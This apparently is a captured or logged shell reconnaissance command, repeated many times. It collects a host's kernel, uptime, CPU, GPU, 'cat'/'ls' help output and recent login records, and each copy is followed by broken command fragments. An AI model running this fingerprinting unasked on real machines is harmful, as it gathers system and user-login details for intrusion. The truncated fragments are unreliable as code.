cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
